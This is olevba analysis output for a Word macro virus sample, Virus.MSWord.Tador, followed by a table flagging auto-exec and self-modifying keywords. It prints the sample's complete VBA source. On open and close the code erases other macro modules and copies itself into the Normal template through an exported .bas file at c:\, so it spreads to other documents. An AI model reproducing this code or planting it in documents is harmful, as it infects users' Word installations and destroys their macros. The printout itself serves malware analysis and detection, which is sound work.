olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tador
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tador - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Anti_VT.bas 
in file: Virus.MSWord.Tador - OLE stream: 'Macros/VBA/Anti_VT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
    Call Macros
    Call Tira
    ActiveDocument.Save
    NormalTemplate.Save
    Options.SaveNormalPrompt = True
End Sub

Sub AutoClose()
On Error Resume Next
    Call Macros
    Call Tira
    NormalTemplate.Save
    Options.SaveNormalPrompt = True
End Sub

Sub Macros()
 On Error Resume Next
    Options.VirusProtection = True
    Options.SaveNormalPrompt = False
    WordBasic.DisableAutoMacros 1
    CommandBars("Tools").Controls("Macro").Visible = True
End Sub

Sub Tira()
    On Error Resume Next
    Set Nor = NormalTemplate.VBProject.VBComponents
    Set Doc = ActiveDocument.VBProject.VBComponents
    For i = 1 To Nor.Count
        If Nor.Item(i).Name <> "Anti_VT" Then
            tam = Nor.Item(i).CodeModule.CountOfLines
            If tam > 0 Then
                Nor.Item(i).CodeModule.DeleteLines 1, tam
            End If
        End If
    Next
    For i = 1 To Doc.Count
        If Doc.Item(i).Name <> "Anti_VT" Then
            tam = Doc.Item(i).CodeModule.CountOfLines
            If tam > 0 Then
                Doc.Item(i).CodeModule.DeleteLines 1, tam
            End If
        End If
    Next
'Exporta o Anti Virus Para o Arquivo ou para o normal.dot
    If Nor.Item("Anti_VT").Name <> "Anti_VT" Then
        Doc("Anti_VT").Export "c:\Anti_VT.bas"
        Nor.Import "c:\Anti_VT.bas"
        NormalTemplate.Save
    End If
    If Doc.Item("Anti_VT").Name <> "Anti_VT" Then
        Nor("Anti_VT").Export "c:\Anti_VT.bas"
        Doc.Import "c:\Anti_VT.bas"
    End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

